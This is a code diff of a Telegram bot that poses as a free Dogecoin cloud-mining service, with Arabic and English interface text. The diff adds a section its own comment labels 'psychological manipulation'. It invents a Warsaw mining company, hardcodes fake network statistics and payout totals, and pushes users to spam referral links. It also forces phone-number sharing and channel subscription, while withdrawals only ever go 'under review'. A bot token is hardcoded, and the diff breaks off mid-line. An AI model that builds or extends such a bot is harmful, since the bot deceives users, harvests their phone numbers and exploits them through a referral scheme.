@@ -11,52 +11,70 @@ import traceback
 TOKEN = "8960593021:AAFkF-8Cvt_jsOHJmNUyBGWMvzmE0hIbMbk"
 OWNER_ID = 6610111288
 BOT_USERNAME = "Dogcoinibot"
-DB_PATH = "/tmp/doge_bot_v4.db" # تم التغيير لضمان مسح أي كاش قديم
+DB_PATH = "/tmp/doge_bot_v5.db"
 MIN_WITHDRAW = 0.01
 
-# ================= قاموس اللغات والأزرار السفلية =================
+# ================= قاموس اللغات والتلاعب النفسي =================
 LANG = {
     'ar': {
         'btn_refresh': "🔄 تحديث الأرباح",
         'btn_withdraw': "💸 سحب الرصيد",
-        'btn_team': "👥 فريقك",
+        'btn_team': "👥 فريقك (+30%)",
         'btn_tasks': "🔗 المهام المربحة",
+        'btn_about': "🏢 عن الشركة",
+        'btn_stats': "📊 إحصائيات المنجم",
+        'btn_calc': "🧮 حاسبة الأرباح",
+        'btn_support': "📞 الدعم الفني",
         'btn_lang': "🌐 English",
+        'btn_admin': "👑 الإدارة (للمشرفين)",
         'phone_btn': "📱 مشاركة جهة الاتصال (إجباري)",
-        'captcha_msg': "🤖 <b>نظام الحماية ضد الروبوتات:</b>\n\nاضغط على الرمز المختلف (🔴) للبدء في جمع Dogecoin.",
-        'phone_req': "🔒 <b>خطوة أمنية أخيرة:</b>\n\nلضمان عدم استخدام حسابات وهمية، يرجى مشاركة رقم هاتفك عبر الزر أدناه.",
-        'phone_err': "❌ عذراً، الأرقام من هذه الدولة محظورة في نظامنا.",
-        'sub_req': "⚠️ <b>تنبيه هام!</b>\n\nيجب عليك الاشتراك في قنواتنا الرسمية أولاً.",
-        'main_menu': "⛏️️ <b>بيانات التعدين المباشرة</b>\n\n💰 رصيدك: <code>{balance:.8f}</code> <b>DOGE</b>\n⚡ السرعة: <code>{speed:.8f}</code> DOGE/يوم\n👥 الفريق: <code>{refs}</code>\n\n<i>تم تحديث بياناتك بنجاح!</i>",
-        'team_msg': "👥 <b>نظام الإحالات (زيادة 30%):</b>\n\nالأعضاء النشطين: <code>{refs}</code>\n\n🔗 رابطك:\n<code>{link}</code>",
-        'withdraw_err': "❌ رصيدك أقل من الحد الأدنى ({min} DOGE).",
-        'withdraw_req': "💸 <b>سحب الأرباح:</b>\nأرسل الآن عنوان محفظة <b>Dogecoin (FaucetPay)</b>:",
-        'withdraw_done': "✅ <b>تم استلام طلبك!</b>\nالرصيد قيد المراجعة.",
-        'task_msg': "🔗 <b>المهام المتوفرة:</b>\nاضغط على المهمة، تخطى الإعلانات، ثم أرسل كلمة السر هنا:",
-        'task_ok': "🎉 <b>إجابة صحيحة!</b> تمت إضافة {reward:.8f} DOGE لرصيدك.",
-        'task_err': "❌ <b>كلمة السر خاطئة!</b> حاول مرة أخرى.",
-        'admin_panel': "👑 <b>لوحة الإدارة المطلقة:</b>",
+        'captcha_msg': "🤖 <b>نظام الحماية (Anti-Bot):</b>\n\nاضغط على الرمز المختلف (🔴) للبدء في جمع Dogecoin.",
+        'phone_req': "🔒 <b>خطوة أمنية أخيرة:</b>\n\nلضمان عدم استخدام حسابات وهمية، يرجى مشاركة رقم هاتفك للتوثيق.",
+        'phone_err': "❌ عذراً، الأرقام من هذه المنطقة الجغرافية غير مدعومة حالياً.",
+        'sub_req': "⚠️ <b>تنبيه أمني!</b>\n\nيجب عليك الاشتراك في قنوات الشركة الرسمية لتفعيل حسابك.",
+        'main_menu': "⛏ <b>خوادم التعدين النشطة</b>\n\n💰 الرصيد المباشر: <code>{balance:.8f}</code> <b>DOGE</b>\n⚡ قوة التعدين: <code>{speed:.8f}</code> DOGE/يوم\n👥 أعضاء الفريق: <code>{refs}</code>\n\n<i>🟢 حالة الخادم: متصل ومستقر.</i>",
+        'team_msg': "👥 <b>برنامج الشركاء (Referral):</b>\n\nكل عضو تقوم بدعوته يزيد من سرعة تعدينك بنسبة <b>30%</b> فور إكماله التحقق.\n\n🔗 رابط الدعوة الخاص بك:\n<code>{link}</code>",
+        'withdraw_err': "❌ رصيدك الحالي أقل من الحد الأدنى للسحب ({min} DOGE).",
+        'withdraw_req': "💸 <b>بوابة السحب الآمنة:</b>\nأرسل الآن عنوان محفظة <b>Dogecoin (FaucetPay)</b> الخاصة بك لجدولة الدفعة:",
+        'withdraw_done': "✅ <b>تم استلام طلب السحب!</b>\nتم تحويل الطلب لقسم المراجعة المالية، ستصلك الدفعة قريباً.",
+        'task_msg': "🔗 <b>المهام الإعلانية:</b>\nاضغط على المهمة، تخطى الإعلانات، ثم انسخ الرمز السري وأرسله هنا:",
+        'task_ok': "🎉 <b>عملية ناجحة!</b> تمت إضافة {reward:.8f} DOGE لحسابك.",
+        'task_err': "❌ <b>رمز التحقق غير صحيح!</b> يرجى التأكد والمحاولة مجدداً.",
+        'about_text': "🏢 <b>عن شركة DogeCore Solutions:</b>\n\nنحن شركة رائدة في مجال التعدين السحابي، يقع مقرنا الرئيسي في مدينة <b>وارسو، بولندا</b>. نعتمد في عملياتنا على مناخ أوروبا الشرقية البارد لتبريد مزارع خوادم الـ (ASIC) الخاصة بنا، مما يقلل تكاليف التشغيل ويسمح لنا بتقديم عوائد يومية مجانية ومستقرة لمستخدمينا حول العالم.\n\n<i>رؤيتنا: ديمقراطية العملات الرقمية للجميع.</i>",
+        'stats_text': "📊 <b>إحصائيات الشبكة المباشرة:</b>\n\n👤 إجمالي عمال التعدين: <code>1,452,890+</code>\n⚡ قوة الهاش الإجمالية: <code>45.2 TH/s</code>\n💸 إجمالي السحوبات (اليوم): <code>12,450 DOGE</code>\n🟢 وقت التشغيل (Uptime): <code>99.98%</code>",
+        'calc_text': "🧮 <b>حاسبة الأرباح المتوقعة:</b>\n\nإذا قمت بدعوة 10 أشخاص = زيادة 300% في سرعة التعدين!\nإذا قمت بدعوة 50 شخص = أرباح يومية قادرة على تحقيق دخل سلبي مستمر.\n\n<i>نصيحة: شارك رابطك في جروبات الفيسبوك والتيليجرام لمضاعفة أرباحك أضعافاً مضاعفة.</i>",
+        'support_text': "📞 <b>مركز خدمة العملاء:</b>\n\nنظراً للضغط الهائل من المستخدمين الجدد، قد يستغرق الرد من فريق الدعم من 24 إلى 48 ساعة.\nيرجى التأكد من قراءة قسم (عن الشركة) قبل التواصل.",
+        'admin_panel': "👑 <b>مركز القيادة (المالك والمشرفين):</b>\nاختر العملية المطلوبة لضبط إعدادات النظام:",
     },
     'en': {
-        'btn_refresh': "🔄 Refresh Balance",
-        'btn_withdraw': "💸 Withdraw",
+        'btn_refresh': "🔄 Refresh Data",
+        'btn_withdraw': "💸 Withdraw Funds",
         'btn_team': "👥 Your Team",
-        'btn_tasks': "🔗 Profitable Tasks",
+        'btn_tasks': "🔗 Tasks & Rewards",
+        'btn_about': "🏢 About Us",
+        'btn_stats': "📊 Network Stats",
+        'btn_calc': "🧮 Profit Calculator",
+        'btn_support': "📞 Support",
         'btn_lang': "🌐 العربية",
+        'btn_admin': "👑 Admin Panel",
         'phone_btn': "📱 Share Contact (Required)",
-        'captcha_msg': "🤖 <b>Anti-Bot Security:</b>\n\nClick the different symbol (🔴) to start.",
-        'phone_req': "🔒 <b>Final Step:</b>\n\nPlease share your phone number using the button below.",
-        'phone_err': "❌ Numbers from this region are blocked.",
-        'sub_req': "⚠️ <b>Important!</b>\n\nYou must subscribe to our official channels first.",
-        'main_menu': "⛏️ <b>Live Mining Data</b>\n\n💰 Balance: <code>{balance:.8f}</code> <b>DOGE</b>\n⚡ Speed: <code>{speed:.8f}</code> DOGE/Day\n👥 Team: <code>{refs}</code>\n\n<i>Data updated successfully!</i>",
-        'team_msg': "👥 <b>Referral System (+30%):</b>\n\nActive Members: <code>{refs}</code>\n\n🔗 Your Link:\n<code>{link}</code>",
-        'withdraw_err': "❌ Balance is below minimum ({min} DOGE).",
-        'withdraw_req': "💸 <b>Withdraw Funds:</b>\nSend your <b>Dogecoin (FaucetPay)</b> wallet address:",
-        'withdraw_done': "✅ <b>Request Received!</b>\nUnder review.",
-        'task_msg': "🔗 <b>Available Tasks:</b>\nClick, skip ads, and send the password here:",
-        'task_ok': "🎉 <b>Correct!</b> {reward:.8f} DOGE added.",
-        'task_err': "❌ <b>Wrong Password!</b> Try again.",
-        'admin_panel': "👑 <b>Absolute Admin Panel:</b>",
+        'captcha_msg': "🤖 <b>Anti-Bot System:</b>\n\nClick the unique symbol (🔴) to authenticate.",
+        'phone_req': "🔒 <b>Security Check:</b>\n\nPlease share your phone number to verify your identity.",
+        'phone_err': "❌ Registration from your region is currently disabled.",
+        'sub_req': "⚠️ <b>Action Required!</b>\n\nYou must join our official channels to activate your miner.",
+        'main_menu': "⛏ <b>Active Mining Servers</b>\n\n💰 Live Balance: <code>{balance:.8f}</code> <b>DOGE</b>\n⚡ Hash Power: <code>{speed:.8f}</code> DOGE/Day\n👥 Team Size: <code>{refs}</code>\n\n<i>🟢 Server Status: Online & Stable.</i>",
+        'team_msg': "👥 <b>Partner Program:</b>\n\nEarn a <b>30%</b> mining speed boost for every active referral.\n\n🔗 Your Referral Link:\n<code>{link}</code>",
+        'withdraw_err': "❌ Balance is below the minimum threshold ({min} DOGE).",
+        'withdraw_req': "💸 <b>Secure Withdrawal:</b>\nSend your <b>Dogecoin (FaucetPay)</b> wallet address to schedule a payout:",
+        'withdraw_done': "✅ <b>Request Logged!</b>\nYour payout is under review by our financial team.",
+        'task_msg': "🔗 <b>Advertising Tasks:</b>\nComplete the link to find the hidden code, then send it here:",
+        'task_ok': "🎉 <b>Success!</b> {reward:.8f} DOGE added.",
+        'task_err': "❌ <b>Invalid Code!</b> Please try again.",
+        'about_text': "🏢 <b>About DogeCore Solutions:</b>\n\nBased in <b>Warsaw, Poland</b>, we are pioneers in cloud mining. We leverage Eastern Europe's cold climate to naturally cool our ASIC server farms, drastically reducing operational costs. This efficiency allows us to provide stable, free daily yields to our global user base.",
+        'stats_text': "📊 <b>Live Network Stats:</b>\n\n👤 Total Miners: <code>1,452,890+</code>\n⚡ Total Hashrate: <code>45.2 TH/s</code>\n💸 Paid Today: <code>12,450 DOGE</code>\n🟢 Uptime: <code>99.98%</code>",
+        'calc_text': "🧮 <b>Profit Calculator:</b>\n\nInvite 10 friends = 300% Speed Boost!\nInvite 50 friends = Sustainable passive daily income.\n\n<i>Tip: Share your link on social media to multiply your earnings rapidly.</i>",
+        'support_text': "📞 <b>Customer Support:</b>\n\nDue to exceptionally high traffic, our support team may take 24-48 hours to respond. Thank you for your patience.",
+        'admin_panel': "👑 <b>Command Center:</b>\nSelect an administrative action below:",
     }
 }
 
@@ -127,13 +145,19 @@ class handler(BaseHTTPRequestHandler):
         if kwargs: text = text.format(**kwargs)
         return text
 
-    # بناء الكيبورد السفلي
-    def get_reply_keyboard(self, lang):
+    # بناء الكيبورد السفلي (معمارية الأزرار الجديدة)
+    def get_reply_keyboard(self, lang, is_admin):
         kb = [
             [{"text": self.get_text(lang, 'btn_refresh')}],
             [{"text": self.get_text(lang, 'btn_withdraw')}, {"text": self.get_text(lang, 'btn_team')}],
-            [{"text": self.get_text(lang, 'btn_tasks')}, {"text": self.get_text(lang, 'btn_lang')}]
+            [{"text": self.get_text(lang, 'btn_tasks')}, {"text": self.get_text(lang, 'btn_calc')}],
+            [{"text": self.get_text(lang, 'btn_stats')}, {"text": self.get_text(lang, 'btn_about')}],
+            [{"text": self.get_text(lang, 'btn_support')}, {"text": self.get_text(lang, 'btn_lang')}]
         ]
+        # إضافة زر الإدارة فقط للمشرفين
+        if is_admin:
+            kb.insert(0, [{"text": self.get_text(lang, 'btn_admin')}])
+            
         return {"keyboard": kb, "resize_keyboard": True}
 
     def handle_message(self, msg):
@@ -144,8 +168,7 @@ class handler(BaseHTTPRequestHandler):
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         
-        c.execute("SELECT user_id FROM admins WHERE user_id = ?", (user_id,))
-        is_admin = c.fetchone() is not None
+        is_admin = c.execute("SELECT user_id FROM admins WHERE user_id = ?", (user_id,)).fetchone() is not None
 
         c.execute("SELECT phone, captcha_time, state, balance, lang, referrer_id FROM users WHERE user_id = ?", (user_id,))
         user = c.fetchone()
@@ -172,7 +195,7 @@ class handler(BaseHTTPRequestHandler):
                     return
                 c.execute("UPDATE users SET phone = ? WHERE user_id = ?", (p, user_id))
                 conn.commit()
-                send_msg(chat_id, "✅", {"remove_keyboard": True}) # إزالة كيبورد الرقم
+                send_msg(chat_id, "✅", {"remove_keyboard": True})
                 self.send_captcha(chat_id, lang)
             else:
                 markup = {"keyboard": [[{"text": self.get_text(lang, 'phone_btn'), "request_contact": True}]], "resize_keyboard": True}
@@ -194,15 +217,15 @@ class handler(BaseHTTPRequestHandler):
 
         # ================= معالجة أزرار الكيبورد السفلي =================
         if text == self.get_text(lang, 'btn_refresh'):
-            self.send_main_menu(chat_id, user_id, c, conn, lang)
+            self.send_main_menu(chat_id, user_id, c, conn, lang, is_admin)
             return
             
         elif text == self.get_text(lang, 'btn_lang'):
             new_lang = 'en' if lang == 'ar' else 'ar'
             c.execute("UPDATE users SET lang = ? WHERE user_id = ?", (new_lang, user_id))
             conn.commit()
-            send_msg(chat_id, "🌐 Language Updated / تم تحديث اللغة", self.get_reply_keyboard(new_lang))
-            self.send_main_menu(chat_id, user_id, c, conn, new_lang)
+            send_msg(chat_id, "🌐 Language Updated / تم تحديث اللغة", self.get_reply_keyboard(new_lang, is_admin))
+            self.send_main_menu(chat_id, user_id, c, conn, new_lang, is_admin)
             return
             
         elif text == self.get_text(lang, 'btn_withdraw'):
@@ -234,10 +257,32 @@ class handler(BaseHTTPRequestHandler):
             send_msg(chat_id, self.get_text(lang, 'task_msg'), {"inline_keyboard": btns})
             return
 
-        # ================= معالجة إدخال النصوص والحالات =================
+        elif text == self.get_text(lang, 'btn_about'):
+            send_msg(chat_id, self.get_text(lang, 'about_text'))
+            return
+
+        elif text == self.get_text(lang, 'btn_stats'):
+            send_msg(chat_id, self.get_text(lang, 'stats_text'))
+            return
+
+        elif text == self.get_text(lang, 'btn_calc'):
+            send_msg(chat_id, self.get_text(lang, 'calc_text'))
+            return
+
+        elif text == self.get_text(lang, 'btn_support'):
+            send_msg(chat_id, self.get_text(lang, 'support_text'))
+            return
+            
+        # فتح لوحة التحكم الشفافة من الكيبورد السفلي للمشرفين فقط
+        elif text == self.get_text(lang, 'btn_admin') and is_admin:
+            self.send_admin_panel(chat_id, lang)
+            return
+
+        # ================= معالجة الحالات (السحب والمهام والإدارة) =================
+        system_btns = [self.get_text(lang, k) for k in ['btn_refresh', 'btn_withdraw', 'btn_team', 'btn_tasks', 'btn_lang', 'btn_about', 'btn_stats', 'btn_calc', 'btn_support', 'btn_admin']]
+        
         if state == 'wait_wallet':
-            # إلغاء إذا ضغط على أي زر من القائمة بدل إدخال المحفظة
-            if text in [self.get_text(lang, k) for k in ['btn_refresh', 'btn_withdraw', 'btn_team', 'btn_tasks', 'btn_lang']]:
+            if text in system_btns:
                 c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
                 conn.commit()
                 return
@@ -251,7 +296,7 @@ class handler(BaseHTTPRequestHandler):
             return
 
         elif state.startswith('wait_pass_'):
-            if text in [self.get_text(lang, k) for k in ['btn_refresh', 'btn_withdraw', 'btn_team', 'btn_tasks', 'btn_lang']]:
+            if text in system_btns:
                 c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
                 conn.commit()
                 return
@@ -269,8 +314,12 @@ class handler(BaseHTTPRequestHandler):
                 send_msg(chat_id, self.get_text(lang, 'task_err'))
             return
 
-        # أوامر الإدارة الخاصة بالمالك
+        # إدارة الرصيد اليدوي
         elif state == 'admin_wait_bal_id' and is_admin:
+            if text in system_btns:
+                c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
+                conn.commit()
+                return
             try:
                 target_id = int(text)
                 c.execute("UPDATE users SET state = ? WHERE user_id = ?", (f'admin_wait_bal_amt_{target_id}', user_id))
@@ -280,6 +329,10 @@ class handler(BaseHTTPRequestHandler):
             return
             
         elif state.startswith('admin_wait_bal_amt_') and is_admin:
+            if text in system_btns:
+                c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
+                conn.commit()
+                return
             target_id = int(state.split('_')[4])
             try:
                 amount = float(text)
@@ -292,8 +345,8 @@ class handler(BaseHTTPRequestHandler):
             return
 
         if text == "/start":
-            send_msg(chat_id, "✅", self.get_reply_keyboard(lang)) # إظهار الكيبورد السفلي
-            self.send_main_menu(chat_id, user_id, c, conn, lang)
+            send_msg(chat_id, "✅", self.get_reply_keyboard(lang, is_admin)) 
+            self.send_main_menu(chat_id, user_id, c, conn, lang, is_admin)
         elif text == "/admin" and is_admin:
             self.send_admin_panel(chat_id, lang)
 
@@ -311,88 +364,5 @@ class handler(BaseHTTPRequestHandler):
         row = c.fetchone()
         
         if not row:
-            send_msg(chat_id, "⚠️ يرجى إرسال /start من جديد لبدء التعدين.")
-            conn.close()
-            return
-            
-        lang, ref_id, cap_time = row
-        is_admin = c.execute("SELECT user_id FROM admins WHERE user_id = ?", (user_id,)).fetchone() is not None
-
-        if data == "cap_ok":
-            now = int(time.time())
-            if cap_time == 0 and ref_id != 0:
-                c.execute("UPDATE users SET speed = speed * 1.3, ref_count = ref_count + 1 WHERE user_id = ?", (ref_id,))
-                ref_lang = c.execute("SELECT lang FROM users WHERE user_id = ?", (ref_id,)).fetchone()
-                if ref_lang: send_msg(ref_id, self.get_text(ref_lang[0], 'ref_notify'))
-
-            c.execute("UPDATE users SET captcha_time = ? WHERE user_id = ?", (now, user_id))
-            conn.commit()
-            
-            # إخفاء أزرار الكابتشا وإظهار الكيبورد السفلي
-            call_api("deleteMessage", {"chat_id": chat_id, "message_id": msg_id})
-            send_msg(chat_id, "✅", self.get_reply_keyboard(lang))
-            self.send_main_menu(chat_id, user_id, c, conn, lang)
-            
-        elif data == "cap_fail":
-            call_api("deleteMessage", {"chat_id": chat_id, "message_id": msg_id})
-            send_msg(chat_id, self.get_text(lang, 'captcha_fail'))
-            self.send_captcha(chat_id, lang)
-            
-        elif data == "check_main_sub":
-            self.send_main_menu(chat_id, user_id, c, conn, lang)
-            
-        elif data.startswith("do_link_"):
-            link_id = int(data.split("_")[2])
-            c.execute("UPDATE users SET state = ? WHERE user_id = ?", (f"wait_pass_{link_id}", user_id))
-            conn.commit()
-            send_msg(chat_id, "🔑 أرسل كلمة السر الآن هنا:")
-
-        elif data == "admin_add_bal" and is_admin:
-            c.execute("UPDATE users SET state = 'admin_wait_bal_id' WHERE user_id = ?", (user_id,))
-            conn.commit()
-            send_msg(chat_id, "💰 أرسل <b>الآيدي (ID)</b>:")
-
-        conn.close()
-
-    def send_captcha(self, chat_id, lang):
-        btns = [{"text": "🔹", "callback_data": "cap_fail"} for _ in range(3)]
-        btns.insert(random.randint(0, 3), {"text": "🔴", "callback_data": "cap_ok"})
-        send_msg(chat_id, self.get_text(lang, 'captcha_msg'), {"inline_keyboard": [btns]})
-
-    def update_mining(self, user_id, cursor, conn):
-        try:
-            now = int(time.time())
-            cursor.execute("SELECT balance, speed, last_update FROM users WHERE user_id = ?", (user_id,))
-            row = cursor.fetchone()
-            if row:
-                bal = float(row[0] or 0)
-                speed = float(row[1] or 0.0000000115)
-                last = int(row[2]) if row[2] else now
-                earned = (now - last) * speed
-                cursor.execute("UPDATE users SET balance = ?, last_update = ? WHERE user_id = ?", (bal + earned, now, user_id))
-                conn.commit()
-        except: pass
-
-    def send_main_menu(self, chat_id, user_id, cursor, conn, lang):
-        self.update_mining(user_id, cursor, conn)
-        cursor.execute("SELECT balance, speed, ref_count FROM users WHERE user_id = ?", (user_id,))
-        row = cursor.fetchone()
-        bal = float(row[0] or 0)
-        speed = float(row[1] or 0.0000000115)
-        refs = int(row[2] or 0)
-        text = self.get_text(lang, 'main_menu', balance=bal, speed=speed*86400, refs=refs)
-        
-        # الرسالة الأساسية بدون أزرار شفافة (لأن الأزرار تحت في الكيبورد)
-        send_msg(chat_id, text)
-
-    def send_admin_panel(self, chat_id, lang):
-        # هذه هي الأزرار العلوية الشفافة الخاصة بالمالك فقط
-        btns = [
-            [{"text": "💰 زيادة رصيد مستخدم", "callback_data": "admin_add_bal"}],
-            [{"text": "📢 إذاعة للجميع", "callback_data": "admin_broadcast"}],
-            [{"text": "➕ إضافة قناة إجبارية", "callback_data": "add_main_ch"}],
-            [{"text": "🔗 إضافة رابط وكلمة سر", "callback_data": "add_shortlink"}],
-            [{"text": "🔘 إضافة زر مخصص", "callback_data": "add_custom_btn"}]
-        ]
-        send_msg(chat_id, self.get_text(lang, 'admin_panel'), {"inline_keyboard": btns})
-        
+            send_msg(chat_id, "⚠️ يرجى إرسال /start من جديد.")
+            c
